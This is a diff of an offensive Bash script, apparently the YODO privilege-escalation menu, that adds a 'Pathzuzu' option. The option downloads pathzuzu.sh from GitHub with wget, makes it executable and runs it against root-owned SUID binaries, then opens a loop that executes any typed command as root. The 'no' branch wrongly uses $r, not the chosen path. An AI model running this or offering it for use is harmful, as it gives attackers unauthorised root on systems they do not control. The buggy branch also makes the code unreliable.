@@ -68,7 +68,7 @@ cat << "img"
                      
 img
 echo -e "\e[1;94m=======================================================================\e[m"
-echo -e "\e[1;46m Possible exploitable options (dirtyc0w and VSP excluded):\e[m \e[1;91m"
+echo -e "\e[1;46m Possible exploitable options (dirtyc0w | VSP | Pathzuzu excluded):\e[m \e[1;91m"
 # Check if possible
 sudo -l > check.txt
 # Value check
@@ -124,14 +124,15 @@ echo
 echo -e "\e[1;92m Select From the menu:"
 echo 
 echo "   1) Find                8) More *                15) Tee"
-echo "   2) AWK                 9) Man  *                16) VSP"
-echo "   3) Nmap               10) Dirtyc0w °            17) Credits"
-echo "   4) Vi                 11) Gdb                   18) Update"
-echo "   5) Python             12) Ruby                  99) Exit"
-echo "   6) Irb                13) b3"
+echo "   2) AWK                 9) Man  *                16) VSP °"
+echo "   3) Nmap               10) Dirtyc0w °            17) Pathzuzu °"
+echo "   4) Vi                 11) Gdb                   18) Credits"
+echo "   5) Python             12) Ruby                  19) Update"
+echo "   6) Irb                13) b3                    99) Exit"
 echo "   7) Less *             14) Perl"
 echo -e "\e[m"
 echo " VSP = Vulnerable Script Permissions"
+echo " Pathzuzu = SUID exploitation threw Path vulnerability"
 echo -e "\e[1;93m * user interaction \e[m"
 echo -e "\e[1;93m ° sudo not required \e[m"
 read -p " Enter Number: " number
@@ -269,8 +270,58 @@ elif [ $number = 16 ]; then
        	  done
 	done
 exit $VICTORY
-# CREDITS
+# PATHZUZU
 elif [ $number = 17 ]; then
+	# Download pathzuzu
+	pzlic=LICENCE-PATHZUZU
+	if [ ! -f $pzlic ]; then
+		wget https://raw.githubusercontent.com/ShotokanZH/Pa-th-zuzu/master/LICENSE -O LICENCE-PATHZUZU
+		wget https://raw.githubusercontent.com/ShotokanZH/Pa-th-zuzu/master/pathzuzu.sh
+		chmod +x pathzuzu.sh
+	fi
+	read -p " Specify Path ('/' to find them all) : " pathzuzupath
+	res=$(LC_ALL=C find $pathzuzupath -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{print $9}')
+	for r in $res
+		do echo $r
+	done
+		read -p "Test them all? (yes/no) : " pathResults
+			if [ -z $pathResults ]; then
+				echo "I did not understand"
+			elif [ "$pathResults" == "yes" ] || [ "$pathResults" == "y" ]; then
+				for r in $res
+					do echo "Testing $r..."
+					./pathzuzu.sh -e "whoami" -u 0 $r > /dev/null 
+					if [ $? -eq 0 ]; then
+						echo -e "$r \e[1;92mworked!\e[m"
+						while [ true ]
+							do read -p "Enter command: " p
+							output=$(LC_ALL=C find $pathzuzupath -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{print $9}')
+							./pathzuzu.sh -e "$p" -u 0 $r | sed -n '12,$p' | head -n -10
+						done
+						exit 0
+					fi
+				done
+				echo "Sorry :("
+				exit 1				
+			elif [ "$pathResults" == "no" ] || [ "$pathResults" == "n" ]; then
+				read -p "Specify which one : " specificPath
+				./pathzuzu.sh -e "whoami" -u 0 $specificPath > /dev/null 
+				if [ $? -ne 0 ]; then
+					echo "It doesn't work"
+					exit 1
+				fi
+				echo -e "\e[1;92mworked!\e[m"
+				while [ true ]
+				do read -p "Enter command: " p
+					./pathzuzu.sh -e "$p" -u 0 $r | sed -n '12,$p' | head -n -10
+				done
+			
+			else
+				echo " I did not understand"
+			fi
+
+# CREDITS
+elif [ $number = 18 ]; then
 	echo
 	echo "  YODO version 1.2.0"
 	echo "  Created by: b3rito"
@@ -278,11 +329,11 @@ elif [ $number = 17 ]; then
 	echo "  Homepage: http://mes3hacklab.org/yodo.html"
 	echo "  bug reported by klez | rudeyak"
 	echo "  fix by klez | rudeyak"
-	echo "  contributor: rudeyak"
+	echo "  contributor: rudeyak | klez"
 	echo "  ascii art by m"
 	echo
 # UPDATE
-elif [ $number = 18 ]; then
+elif [ $number = 19 ]; then
 	wget "https://raw.githubusercontent.com/b3rito/yodo/master/yodo.sh" -O yodo.sh
 # EXIT
 elif [ $number = 99 ]; then
